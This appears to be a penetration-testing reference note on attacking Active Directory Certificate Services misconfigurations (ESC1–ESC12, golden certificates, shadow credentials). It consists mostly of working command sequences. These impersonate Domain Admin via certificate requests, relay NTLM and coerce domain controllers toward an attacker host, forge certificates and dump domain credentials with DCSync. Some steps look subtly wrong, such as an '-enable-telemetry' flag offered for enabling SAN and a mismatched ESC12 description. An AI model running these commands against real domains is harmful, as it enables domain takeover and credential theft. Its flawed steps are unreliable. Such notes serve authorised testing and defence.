---
title: "Active Directory Certificate Services (ADCS) Reference"
created: "2026-04-15"
type: reference-note
status: active
tags:
  - active-directory
  - adcs
  - certificates
  - esc-misconfigurations
  - certipy
---

# Active Directory Certificate Services (ADCS) Reference

Reference for ADCS misconfigurations (ESC1-ESC12) and exploitation techniques. See also: [[AD-Enumeration-Reference]], [[AD-Kerberos-Attacks]], [[AD-Credential-Attacks]], [[Active-Directory-Cheatsheet]].

---

## Table of Contents

- [[#ADCS Overview]]
- [[#Enumeration]]
- [[#ESC1 - Misconfigured Certificate Templates]]
- [[#ESC2 - Misconfigured Certificate Templates (Any Purpose)]]
- [[#ESC3 - Misconfigured Enrollment Agent Templates]]
- [[#ESC4 - Vulnerable Certificate Template Access Control]]
- [[#ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2]]
- [[#ESC7 - Vulnerable CA Access Control]]
- [[#ESC8 - NTLM Relay to ADCS Web Enrollment]]
- [[#ESC9 - No Security Extension]]
- [[#ESC10 - Weak Certificate Mappings]]
- [[#ESC11 - IF_ENFORCEENCRYPTICERTREQUEST]]
- [[#ESC12 - SHELL Access to CA]]
- [[#Golden Certificates]]
- [[#Shadow Credentials via ADCS]]

---

## ADCS Overview

Active Directory Certificate Services (ADCS) provides PKI services. Misconfigurations allow privilege escalation from a low-privileged user to Domain Admin.

**Key concepts:**
- **CA (Certificate Authority)** - Issues certificates
- **Certificate Template** - Defines what a cert can do (EKU, SANs, enrollment permissions)
- **EKU (Extended Key Usage)** - Controls certificate usage (Client Auth, Smart Card Logon, etc.)
- **SAN (Subject Alternative Name)** - Alternative identities the cert applies to

---

## Enumeration

### Certipy (Python - Recommended)

```bash
# Enumerate all ADCS info
certipy find -u jdoe@corp.local -p password -dc-ip <DC_IP>

# Enumerate vulnerable templates only
certipy find -u jdoe@corp.local -p password -dc-ip <DC_IP> -vulnerable

# Output to bloodhound format
certipy find -u jdoe@corp.local -p password -dc-ip <DC_IP> -bloodhound

# With NTLM hash
certipy find -u jdoe@corp.local -hashes :NTLMHASH -dc-ip <DC_IP>
```

### Certify (C# - Windows)

```powershell
# Enumerate CAs and templates
.\Certify.exe cas
.\Certify.exe find
.\Certify.exe find /vulnerable
.\Certify.exe find /vulnerable /currentuser

# Check specific template
.\Certify.exe find /template:"UserAuthentication"
```

### PowerShell / PSPKI

```powershell
Import-Module PSPKI
Get-CertificationAuthority | Get-CATemplate
Get-CertificationAuthority | Get-CertificationAuthorityAcl
```

---

## ESC1 - Misconfigured Certificate Templates

**Requirements:**
1. CA grants enrollment rights to low-privileged users
2. Manager approval is NOT required
3. No authorized signatures required
4. Template allows `ENROLLEE_SUPPLIES_SUBJECT` (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
5. Template has Client Authentication EKU

**Impact:** Any enrolled user can request a certificate for ANY user (including DA), then authenticate as that user.

### Exploitation with Certipy

```bash
# Request cert as Domain Admin
certipy req -u jdoe@corp.local -p password -ca corp-DC01-CA -target <CA_IP> -template VulnTemplate -upn administrator@corp.local

# Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>

# Get TGT via PKINIT
certipy auth -pfx administrator.pfx -domain corp.local -username administrator -dc-ip <DC_IP>
```

### Exploitation with Certify + Rubeus

```powershell
# Request certificate
.\Certify.exe request /ca:corp-DC01-CA /template:VulnTemplate /altname:administrator

# Convert PEM to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Authenticate
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:certpass /ptt
```

---

## ESC2 - Misconfigured Certificate Templates (Any Purpose)

**Requirements:**
1. Same as ESC1 but template has "Any Purpose" EKU OR no EKU defined

**Impact:** Can be used for client auth even without explicit Client Auth EKU.

```bash
certipy req -u jdoe@corp.local -p password -ca corp-DC01-CA -template ESC2Template -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

---

## ESC3 - Misconfigured Enrollment Agent Templates

**Requirements:**
1. Template allows "Certificate Request Agent" EKU
2. Another template allows enrollment on behalf of another user with manager approval not required

**Impact:** Two-step attack: get an enrollment agent cert, then request a cert on behalf of another user.

```bash
# Step 1: Get enrollment agent cert
certipy req -u jdoe@corp.local -p password -ca corp-DC01-CA -template EnrollmentAgentTemplate

# Step 2: Request cert on behalf of DA
certipy req -u jdoe@corp.local -p password -ca corp-DC01-CA -template User -on-behalf-of corp\\administrator -pfx agent.pfx

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

---

## ESC4 - Vulnerable Certificate Template Access Control

**Requirements:** Low-privileged user has Write permissions on a certificate template (GenericWrite, WriteDACL, WriteOwner, etc.)

**Impact:** Modify the template to introduce ESC1 vulnerability.

```bash
# Modify template to enable ESC1
certipy template -u jdoe@corp.local -p password -template VulnTemplate -save-old
# Certipy adds ENROLLEE_SUPPLIES_SUBJECT flag and disables manager approval

# Then exploit as ESC1
certipy req -u jdoe@corp.local -p password -ca corp-DC01-CA -template VulnTemplate -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>

# Restore original template
certipy template -u jdoe@corp.local -p password -template VulnTemplate -configuration VulnTemplate.json
```

---

## ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2

**Requirements:** CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set

**Impact:** ANY template allowing client auth can have SANs specified by the requester — same effect as ESC1 for all templates.

```bash
# Check if flag is set (Certify)
.\Certify.exe cas

# Exploit any Client Auth template
certipy req -u jdoe@corp.local -p password -ca corp-DC01-CA -template User -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

---

## ESC7 - Vulnerable CA Access Control

**Requirements:** Low-privileged user has `ManageCA` or `ManageCertificates` on the CA itself.

**Impact:**
- `ManageCA` → Can enable `EDITF_ATTRIBUTESUBJECTALTNAME2` flag (enabling ESC6) OR approve pending requests
- `ManageCertificates` → Can approve pending certificate requests

```bash
# With ManageCA - enable SubjectAltName
certipy ca -u jdoe@corp.local -p password -ca corp-DC01-CA -target <CA_IP> -enable-telemetry

# With ManageCertificates - approve pending requests
# First, request a cert that requires manager approval but specify UPN
certipy req -u jdoe@corp.local -p password -ca corp-DC01-CA -template SubCA -upn administrator@corp.local
# Note the request ID

# Approve the request
certipy ca -u jdoe@corp.local -p password -ca corp-DC01-CA -target <CA_IP> -issue-request <request_id>

# Retrieve approved cert
certipy req -u jdoe@corp.local -p password -ca corp-DC01-CA -retrieve <request_id>

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

---

## ESC8 - NTLM Relay to ADCS Web Enrollment

**Requirements:**
1. ADCS Web Enrollment interface is enabled (http://<CA>/certsrv/)
2. Web enrollment uses HTTP (not HTTPS with required client cert)
3. Ability to force NTLM authentication (coerce attack)

**Impact:** Relay DC's machine account authentication to ADCS web enrollment to get a DC certificate → DCSync.

```bash
# Step 1: Start ntlmrelayx targeting ADCS web enrollment
ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Step 2: Coerce DC authentication (SpoolSample, PetitPotam, PrinterBug, etc.)
python3 PetitPotam.py <ATTACKER_IP> <DC_IP>
# OR
python3 printerbug.py corp.local/jdoe:password@<DC_IP> <ATTACKER_IP>

# Step 3: Receive base64 certificate in ntlmrelayx output
# Step 4: Authenticate using DC cert
python3 gettgtpkinit.py -pfx-base64 <base64cert> corp.local/DC01$ dc01.ccache
export KRB5CCNAME=dc01.ccache

# Step 5: DCSync using Kerberos ticket
secretsdump.py -k -no-pass corp.local/DC01$@dc01.corp.local
```

### Using Certipy for ESC8

```bash
# Start relay
certipy relay -ca <CA_IP> -template DomainController

# Coerce auth
python3 PetitPotam.py <ATTACKER_IP> <DC_IP>

# Auth with cert
certipy auth -pfx dc01.pfx -dc-ip <DC_IP>
```

---

## ESC9 - No Security Extension

**Requirements:**
1. Template has `CT_FLAG_NO_SECURITY_EXTENSION` flag
2. `StrongCertificateBindingEnforcement` registry key is 0 or 1 on DC

**Impact:** Certificate can be used to authenticate even if UPN changes after issuance.

```bash
# If we have GenericWrite on a user, we can change their UPN
certipy account update -u jdoe@corp.local -p password -user victim -upn administrator@corp.local

# Request cert for victim (with modified UPN)
certipy req -u victim@corp.local -p victimpass -ca corp-DC01-CA -template ESC9Template

# Restore victim's UPN
certipy account update -u jdoe@corp.local -p password -user victim -upn victim@corp.local

# Authenticate as administrator
certipy auth -pfx victim.pfx -domain corp.local -dc-ip <DC_IP>
```

---

## ESC10 - Weak Certificate Mappings

**Requirements:** `StrongCertificateBindingEnforcement` = 0 (allows weak certificate mapping), and attacker controls a user with GenericWrite on another.

Similar to ESC9 but involving userPrincipalName manipulation.

```bash
# Change target user's UPN to administrator
certipy account update -u jdoe@corp.local -p password -user victim -upn administrator

# Request cert for victim
certipy req -u victim@corp.local -p victimpass -ca corp-DC01-CA -template User

# Restore UPN
certipy account update -u jdoe@corp.local -p password -user victim -upn victim@corp.local

# Authenticate
certipy auth -pfx victim.pfx -dc-ip <DC_IP>
```

---

## ESC11 - IF_ENFORCEENCRYPTICERTREQUEST

**Requirements:** CA has `IF_ENFORCEENCRYPTICERTREQUEST` NOT set, allowing NTLM relay of non-signing requests.

Similar to ESC8 but relaying to RPC instead of web enrollment.

---

## ESC12 - SHELL Access to CA

**Requirements:** CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` set and attacker has SHELL/RCE on the CA machine.

Allows direct manipulation of CA database and issuance of arbitrary certificates.

---

## Golden Certificates

If you have CA private key (domain compromise or CA compromise), forge certificates for any user.

```bash
# Extract CA cert and key from CA (requires CA admin/DA)
certipy ca -backup -u administrator@corp.local -p password -ca corp-DC01-CA -target <CA_IP>

# Forge certificate for any user
certipy forge -ca-pfx corp-DC01-CA.pfx -upn administrator@corp.local -subject "CN=Administrator"

# Authenticate
certipy auth -pfx administrator_forged.pfx -dc-ip <DC_IP>
```

---

## Shadow Credentials via ADCS

ADCS can be used for shadow credential attacks by modifying `msDS-KeyCredentialLink`. See [[AD-Credential-Attacks]] for full details.

```bash
# Add shadow credential
certipy shadow add -u jdoe@corp.local -p password -account victim -device-id <GUID>

# Request TGT using shadow cred
certipy shadow auto -u jdoe@corp.local -p password -account victim -dc-ip <DC_IP>
```

---

## Quick Reference - ESC Summary

| ESC | Condition | Tool |
|-----|-----------|------|
| ESC1 | ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU | Certipy req -upn |
| ESC2 | Any Purpose EKU or no EKU | Certipy req -upn |
| ESC3 | Certificate Request Agent EKU | Two-step Certipy |
| ESC4 | Write on template ACL | Certipy template |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | Certipy req -upn |
| ESC7 | ManageCA/ManageCertificates on CA | Certipy ca |
| ESC8 | HTTP enrollment + coerce | ntlmrelayx + coerce |
| ESC9 | CT_FLAG_NO_SECURITY_EXTENSION | Certipy account update |
| ESC10 | Weak binding + UPN control | Certipy account update |
